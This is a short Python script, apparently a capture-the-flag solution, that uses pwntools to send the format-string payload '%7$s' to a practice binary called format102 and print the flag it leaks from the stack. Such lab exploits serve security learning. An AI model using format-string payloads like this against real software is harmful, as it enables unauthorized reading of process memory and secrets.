from pwn import *

r = process("./source/format102")
#r = remote("formatstring102.heltsikker.no", 9002)

r.sendline("%7$s")
r.recvuntil("Output: ")
data = r.recvline()
print("Flag:", data)

